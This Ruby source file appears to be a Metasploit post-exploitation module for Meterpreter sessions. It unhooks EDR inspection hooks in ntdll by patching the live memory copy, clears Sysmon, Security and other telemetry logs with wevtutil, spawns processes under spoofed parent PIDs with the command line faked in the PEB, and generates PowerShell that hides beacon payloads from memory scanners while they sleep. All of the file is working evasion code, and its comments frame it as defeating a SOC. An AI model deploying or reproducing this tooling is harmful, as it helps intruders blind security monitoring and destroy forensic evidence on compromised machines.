# -*- coding: binary -*-
##
# EDR Telemetry & SIEM Evasion helpers.
#
# Provides four independent capabilities that individually reduce the
# telemetry footprint of a Meterpreter session and collectively make it
# significantly harder for a SOC to correlate session activity with alerts.
#
# Capability overview
# -------------------
#
# 1. ntdll hook detection + restoration  (detect_ntdll_hooks / restore_ntdll_stubs)
#    EDR products install user-mode hooks by overwriting the first 5-8 bytes of
#    syscall stubs in ntdll.dll with a JMP to their own inspection code.  This
#    capability reads the on-disk ntdll image (always clean), compares it
#    byte-for-byte against the live in-memory copy for each named function, and
#    optionally patches the live copy back to the original bytes.
#    The patch path uses Meterpreter memory.write (which does not go through
#    the hooked ntdll path) and Railgun VirtualProtect.
#
# 2. Selective event log channel clearing  (clear_edr_channels)
#    Clearing ALL Windows event logs is a tier-1 SIEM alert.  This helper
#    clears only the channels that contain the highest-value EDR telemetry
#    (Sysmon, PowerShell/Operational, Security, WMI-Activity) while leaving
#    Application, Setup, and other channels untouched.  A curated subset of
#    Security EventIDs is also noted so callers can decide on per-ID scope.
#
# 3. Process spawn camouflage  (spawn_camouflaged)
#    Augments the existing PPID-spoof option with:
#    - A plausibility map that picks a believable parent process for each
#      target executable (e.g. wmiprvse.exe → WmiPrvSE, svchost.exe → services)
#    - A command-line masquerade that overwrites the visible command line in the
#      PEB with an innocuous string via NtQueryInformationProcess + memory.write
#
# 4. In-memory sleep obfuscation (PowerShell)  (sleep_obfuscation_snippet)
#    Generates a PowerShell snippet that, before sleeping, XOR-encrypts a
#    nominated variable's byte content and zeroes the original, then restores
#    it after waking.  Useful for keeping script-resident payloads off the heap
#    during the inactive period when memory scanners are most likely to fire.
#
# Prerequisites
# -------------
#   include Msf::Post::Windows::EdrEvasion
#   include Msf::Post::Windows::Priv          (for is_admin? / is_system? checks)
#   include Msf::Post::Common
#
# All Railgun / process-memory calls require an active Meterpreter session.
##

module Msf
  class Post
    module Windows
      module EdrEvasion

        # ---------------------------------------------------------------- #
        # Constants
        # ---------------------------------------------------------------- #

        # Syscall stubs most commonly targeted by EDR hooks.
        # Ordered by sensitivity: allocation → write → thread creation → APC
        DEFAULT_HOOK_TARGETS = %w[
          NtAllocateVirtualMemory
          NtWriteVirtualMemory
          NtProtectVirtualMemory
          NtCreateThreadEx
          NtQueueApcThread
          NtOpenProcess
          NtReadVirtualMemory
          NtMapViewOfSection
          NtUnmapViewOfSection
          NtCreateSection
          NtSuspendThread
          NtResumeThread
        ].freeze

        # x64 syscall stub signature: mov r10,rcx / mov eax,SSN
        CLEAN_STUB_MAGIC_X64 = "\x4C\x8B\xD1\xB8".freeze
        # x86 syscall stub signature: mov eax,SSN
        CLEAN_STUB_MAGIC_X86 = "\xB8".freeze

        # Hook indicators: E9=jmp rel32, FF25=jmp [rip+mem], 48B8=mov rax,imm64+jmp
        JMP_OPCODES = ["\xE9", "\xFF\x25", "\x48\xB8"].freeze

        # Event log channels that carry the highest-value EDR / SIEM telemetry.
        # Ordered: most critical first.
        EDR_CHANNELS = [
          'Microsoft-Windows-Sysmon/Operational',
          'Microsoft-Windows-PowerShell/Operational',
          'Microsoft-Windows-WMI-Activity/Operational',
          'Microsoft-Windows-TaskScheduler/Operational',
          'Microsoft-Windows-Windows Defender/Operational',
          'Security',
          'System'
        ].freeze

        # Security EventIDs that reveal attacker activity.  Operators can
        # pass this list to any targeted-clear helper they build.
        EDR_EVENT_IDS = {
          4688 => 'Process creation',
          4689 => 'Process exit',
          4624 => 'Logon success',
          4625 => 'Logon failure',
          4648 => 'Explicit credential logon',
          4697 => 'Service install',
          4698 => 'Scheduled task created',
          4702 => 'Scheduled task updated',
          4720 => 'User account created',
          4776 => 'Kerberos pre-auth (NTLM)',
          7045 => 'New service (System log)'
        }.freeze

        # Map target exe names to plausible parent process names.
        # A process created with one of these parents will not trigger
        # "suspicious parent" behavioural detections.
        PARENT_PLAUSIBILITY = {
          'powershell.exe' => %w[wmiprvse.exe svchost.exe explorer.exe],
          'cmd.exe'        => %w[explorer.exe svchost.exe conhost.exe],
          'msiexec.exe'    => %w[services.exe svchost.exe],
          'regsvr32.exe'   => %w[svchost.exe explorer.exe msiexec.exe],
          'rundll32.exe'   => %w[svchost.exe explorer.exe dllhost.exe],
          'wscript.exe'    => %w[explorer.exe svchost.exe],
          'cscript.exe'    => %w[svchost.exe wmiprvse.exe],
          'mshta.exe'      => %w[explorer.exe svchost.exe],
          'notepad.exe'    => %w[explorer.exe userinit.exe],
          'default'        => %w[svchost.exe explorer.exe]
        }.freeze

        # ---------------------------------------------------------------- #
        # 1. ntdll hook detection + restoration
        # ---------------------------------------------------------------- #

        # Examine the live in-memory copy of ntdll for each named function and
        # compare the first bytes against the known clean stub signatures.
        #
        # @param functions [Array<String>] list of ntdll export names to inspect
        # @return [Hash] { function_name => :clean | :hooked | :unknown }
        def detect_ntdll_hooks(functions = DEFAULT_HOOK_TARGETS)
          results = {}
          base    = ntdll_base_address
          return results unless base && base != 0

          disk    = read_ntdll_from_disk
          return results unless disk

          exports = parse_ntdll_exports(disk)
          arch    = session.arch

          functions.each do |fname|
            info = exports[fname]
            unless info
              results[fname] = :unknown
              next
            end

            live_bytes = session.sys.process.memory.read(base + info[:rva], 16)
            next unless live_bytes && live_bytes.length == 16

            results[fname] = hook_detected?(live_bytes, arch) ? :hooked : :clean
          end

          results
        end

        # Restore the original syscall stub bytes for any hooked functions by
        # reading them from the on-disk ntdll image and writing them back to
        # the live copy.
        #
        # @param functions [Array<String>] functions to restore; defaults to all
        #   known hook targets
        # @return [Array<String>] list of function names that were patched
        def restore_ntdll_stubs(functions = DEFAULT_HOOK_TARGETS)
          base    = ntdll_base_address
          return [] unless base && base != 0

          disk    = read_ntdll_from_disk
          return [] unless disk

          exports = parse_ntdll_exports(disk)
          patched = []

          functions.each do |fname|
            info = exports[fname]
            next unless info && info[:file_off]

            live_bytes  = session.sys.process.memory.read(base + info[:rva], 16)
            next unless live_bytes && live_bytes.length == 16
            next unless hook_detected?(live_bytes, session.arch)

            clean_bytes = disk[info[:file_off], 16]
            next unless clean_bytes && clean_bytes.length == 16

            patch_live_ntdll(base + info[:rva], clean_bytes)
            patched << fname
          end

          patched
        end

        # ---------------------------------------------------------------- #
        # 2. Selective event log clearing
        # ---------------------------------------------------------------- #

        # Return the default list of EDR-relevant log channels.
        def edr_channels
          EDR_CHANNELS.dup
        end

        # Clear only the nominated event log channels.  By default clears the
        # EDR-relevant channels and leaves everything else intact.
        #
        # Clearing a curated subset is significantly less suspicious to a SOC
        # than a full log wipe — many environments generate alerts on
        # "all Security log events cleared" but not on Sysmon channel clears.
        #
        # @param channels [Array<String>] log channel names to clear
        # @return [Hash] { channel => :cleared | :failed | :not_present }
        def clear_edr_channels(channels = edr_channels)
          results = {}

          channels.each do |ch|
            begin
              out = cmd_exec("wevtutil.exe cl \"#{ch}\" 2>&1")
              # wevtutil exits 0 on success, non-zero with an error string otherwise
              if out.to_s.empty? || out =~ /successfully/i
                results[ch] = :cleared
              elsif out =~ /does not exist|not found|incorrect function/i
                results[ch] = :not_present
              else
                results[ch] = :failed
              end
            rescue => e
              results[ch] = :failed
            end
          end

          results
        end

        # ---------------------------------------------------------------- #
        # 3. Process spawn camouflage
        # ---------------------------------------------------------------- #

        # Spawn a process with a spoofed PPID chosen from a plausibility map
        # and an optional command-line mask that hides the real arguments.
        #
        # The PPID is selected based on the name of the target executable: for
        # example, powershell.exe is believable when spawned from wmiprvse.exe or
        # svchost.exe, but not from cmd.exe (which many detection rules flag).
        #
        # @param exe_path [String]  full or partial path to the target executable
        # @param opts     [Hash]
        # @option opts [String]  :args            real command-line arguments
        # @option opts [String]  :mask_cmdline    visible command line override
        # @option opts [Integer] :ppid            explicit PPID (overrides auto)
        # @option opts [Boolean] :hidden          spawn hidden (default true)
        # @return [Rex::Post::Meterpreter::Extensions::Stdapi::Sys::Process]
        def spawn_camouflaged(exe_path, opts = {})
          exe_name = ::File.basename(exe_path.to_s).downcase
          ppid     = opts[:ppid] || select_plausible_ppid(exe_name)
          hidden   = opts.fetch(:hidden, true)
          args     = opts[:args]

          proc = session.sys.process.execute(
            exe_path,
            args,
            'Hidden'     => hidden,
            'Channelized' => false,
            'ParentPid'  => ppid
          )

          if opts[:mask_cmdline] && proc
            mask_process_cmdline(proc.pid, opts[:mask_cmdline])
          end

          proc
        end

        # Return all running process IDs whose name matches a given string.
        #
        # @param name [String] process executable name (case-insensitive)
        # @return [Array<Integer>] matching PIDs
        def pids_for_name(name)
          session.sys.process.get_processes
                 .select { |p| p['name'].casecmp(name).zero? }
                 .map    { |p| p['pid'] }
        end

        # ---------------------------------------------------------------- #
        # 4. Sleep obfuscation (PowerShell)
        # ---------------------------------------------------------------- #

        # Generate a PowerShell snippet that XOR-encrypts a byte-array variable
        # before sleeping and decrypts it on waking.
        #
        # Intended use: wrap around Start-Sleep calls inside a PS-resident
        # beacon/stager so that the payload bytes are not resident in plaintext
        # during the sleep window when periodic memory scanners are most likely
        # to run.
        #
        # @param var_name   [String]  name of the PS variable holding bytes (no $)
        # @param sleep_secs [Integer] sleep duration in seconds
        # @return [String] PowerShell source implementing the obfuscated sleep
        def sleep_obfuscation_snippet(var_name, sleep_secs)
          key_var  = rand_ps_name
          enc_var  = rand_ps_name
          idx_var  = rand_ps_name
          key_val  = rand(1..255)
          jitter   = rand(0..[(sleep_secs * 0.15).to_i, 5].max)

          <<~PSH
            # --- sleep-obfuscation: encrypt #{var_name} before resting ---
            $#{key_var} = #{key_val}
            $#{enc_var} = $#{var_name} | % { $_ -bxor $#{key_var} }
            $#{var_name} = $null
            [System.GC]::Collect()
            [System.GC]::WaitForPendingFinalizers()
            Start-Sleep -Seconds (#{sleep_secs} + (Get-Random -Minimum 0 -Maximum #{[jitter, 1].max}))
            $#{var_name} = [byte[]]($#{enc_var} | % { $_ -bxor $#{key_var} })
            $#{enc_var} = $null; $#{key_var} = 0
            # --- end sleep-obfuscation ---
          PSH
        end

        # ---------------------------------------------------------------- #
        # Private helpers
        # ---------------------------------------------------------------- #
        private

        def ntdll_base_address
          rg     = session.railgun
          handle = rg.kernel32.GetModuleHandleW('ntdll.dll')['return']
          handle == 0 ? nil : handle
        rescue
          nil
        end

        def read_ntdll_from_disk
          sysdir = session.railgun.kernel32.GetSystemDirectoryA(260, 260)['lpBuffer']
          return nil unless sysdir

          ntdll_path = sysdir + '\\ntdll.dll'
          session.fs.file.open(ntdll_path, 'rb') do |f|
            f.read
          end
        rescue => e
          vprint_error("Could not read ntdll from disk: #{e}")
          nil
        end

        # Parse the export table from raw PE bytes.
        # Returns a hash of { name => { rva: Integer, file_off: Integer } }
        def parse_ntdll_exports(raw)
          exports = {}
          return exports if raw.nil? || raw.length < 0x40

          pe_off = raw[0x3C, 4].unpack1('V')
          return exports unless raw[pe_off, 4] == "PE\x00\x00"

          machine  = raw[pe_off + 4, 2].unpack1('v')
          is64     = (machine == 0x8664)
          opt_off  = pe_off + 24
          opt_size = raw[pe_off + 20, 2].unpack1('v')
          sec_off  = opt_off + opt_size
          num_sec  = raw[pe_off + 6, 2].unpack1('v')

          # Build section RVA→file-offset map
          sections = Array.new(num_sec) do |i|
            s = raw[sec_off + i * 40, 40]
            { va: s[12, 4].unpack1('V'), vsz: s[16, 4].unpack1('V'), raw: s[20, 4].unpack1('V') }
          end

          r2f = lambda do |rva|
            sec = sections.find { |s| rva >= s[:va] && rva < s[:va] + s[:vsz] }
            sec ? (sec[:raw] + (rva - sec[:va])) : nil
          end

          # Data directory 0 = export table
          dd_base  = opt_off + (is64 ? 112 : 96)
          exp_rva  = raw[dd_base, 4].unpack1('V')
          return exports if exp_rva == 0

          exp_off = r2f.call(exp_rva)
          return exports unless exp_off

          ed         = raw[exp_off, 40]
          num_names  = ed[24, 4].unpack1('V')
          addr_rva   = ed[28, 4].unpack1('V')
          name_rva   = ed[32, 4].unpack1('V')
          ord_rva    = ed[36, 4].unpack1('V')

          name_base = r2f.call(name_rva)
          ord_base  = r2f.call(ord_rva)
          addr_base = r2f.call(addr_rva)
          return exports unless name_base && ord_base && addr_base

          num_names.times do |i|
            np_rva  = raw[name_base + i * 4, 4]&.unpack1('V')
            next unless np_rva
            np_off = r2f.call(np_rva)
            next unless np_off

            name_end = raw.index("\x00", np_off)
            next unless name_end
            fname = raw[np_off, name_end - np_off]

            ord      = raw[ord_base + i * 2, 2]&.unpack1('v')
            next unless ord
            fn_rva   = raw[addr_base + ord * 4, 4]&.unpack1('V')
            next unless fn_rva
            fn_off   = r2f.call(fn_rva)

            exports[fname] = { rva: fn_rva, file_off: fn_off }
          end

          exports
        end

        # Return true if the given bytes indicate a hook (JMP prefix).
        # bytes is a binary String; use .getbyte(n) to get integer values.
        def hook_detected?(bytes, arch)
          return false unless bytes && bytes.length >= 2

          b0 = bytes.getbyte(0)
          b1 = bytes.getbyte(1)

          # Relative JMP (E9 xx xx xx xx)
          return true if b0 == 0xE9
          # Indirect JMP through memory (FF 25 ...)
          return true if b0 == 0xFF && b1 == 0x25
          # x64: MOV RAX, imm64 + JMP RAX (48 B8 ...)
          return true if arch.to_s == 'x86_64' && b0 == 0x48 && b1 == 0xB8
          # x86/x64: PUSH addr + RET trampoline (68 ... C3)
          return true if b0 == 0x68 && bytes.length > 5 && bytes.getbyte(5) == 0xC3

          false
        end

        # Write clean bytes to live ntdll, temporarily making the page RWX.
        def patch_live_ntdll(address, clean_bytes)
          rg     = session.railgun
          old_p  = rg.kernel32.VirtualProtect(address, clean_bytes.length, 0x40, 4)
          session.sys.process.memory.write(address, clean_bytes)
          rg.kernel32.VirtualProtect(address, clean_bytes.length, old_p['lpflOldProtect'], 4)
        rescue => e
          vprint_error("VirtualProtect/write failed at 0x#{address.to_s(16)}: #{e}")
        end

        # Find a running PID for a plausible parent of exe_name.
        def select_plausible_ppid(exe_name)
          candidates = PARENT_PLAUSIBILITY[exe_name] ||
                       PARENT_PLAUSIBILITY['default']
          running    = session.sys.process.get_processes

          candidates.each do |parent_name|
            match = running.find { |p| p['name'].casecmp(parent_name).zero? }
            return match['pid'] if match
          end

          0  # fall back to no PPID spoofing
        rescue
          0
        end

        # Overwrite the visible command line in the target process's PEB.
        # This changes what Task Manager / Process Explorer / EDR telemetry sees
        # for the process command line without affecting execution.
        def mask_process_cmdline(pid, fake_cmdline)
          rg     = session.railgun
          proc   = session.sys.process.open(pid, 0x1F0FFF) # PROCESS_ALL_ACCESS
          return unless proc

          # Query PEB address via NtQueryInformationProcess (class 0 = ProcessBasicInformation)
          # ProcessBasicInformation structure returns PebBaseAddress at offset 8 (x64) or 4 (x86)
          pbi_size = session.arch == ARCH_X64 ? 48 : 24
          result   = rg.ntdll.NtQueryInformationProcess(proc.handle, 0, pbi_size, pbi_size, 4)
          return unless result['return'] == 0

          pbi_bytes  = result['ProcessInformation']
          peb_addr   = if session.arch == ARCH_X64
                         pbi_bytes[8, 8].unpack1('Q<')
                       else
                         pbi_bytes[4, 4].unpack1('V')
                       end
          return if peb_addr == 0

          # PEB.ProcessParameters offset: 0x20 (x64) / 0x10 (x86)
          pp_ptr_off = session.arch == ARCH_X64 ? 0x20 : 0x10
          pp_bytes   = proc.memory.read(peb_addr + pp_ptr_off, session.arch == ARCH_X64 ? 8 : 4)
          return unless pp_bytes

          pp_addr    = session.arch == ARCH_X64 ? pp_bytes.unpack1('Q<') : pp_bytes.unpack1('V')
          return if pp_addr == 0

          # RTL_USER_PROCESS_PARAMETERS.CommandLine offset: 0x70 (x64) / 0x40 (x86)
          cmdline_off = session.arch == ARCH_X64 ? 0x70 : 0x40
          # UNICODE_STRING: Length(2) + MaximumLength(2) + (4 bytes pad on x64) + Buffer ptr
          us_bytes    = proc.memory.read(pp_addr + cmdline_off, session.arch == ARCH_X64 ? 16 : 8)
          return unless us_bytes

          buf_addr    = session.arch == ARCH_X64 ? us_bytes[8, 8].unpack1('Q<') : us_bytes[4, 4].unpack1('V')
          return if buf_addr == 0

          # Write fake cmdline as UTF-16LE
          fake_utf16 = (fake_cmdline + "\x00").encode('UTF-16LE').b
          proc.memory.write(buf_addr, fake_utf16)

          # Update Length field to match the fake string
          new_len = [(fake_cmdline.length * 2), 0xFFFE].min
          proc.memory.write(pp_addr + cmdline_off, [new_len].pack('v'))
        rescue => e
          vprint_error("Command-line mask failed for PID #{pid}: #{e}")
        ensure
          proc.close rescue nil
        end

        def rand_ps_name
          Rex::Text.rand_text_alpha(rand(4..8))
        end

      end # EdrEvasion
    end   # Windows
  end     # Post
end       # Msf
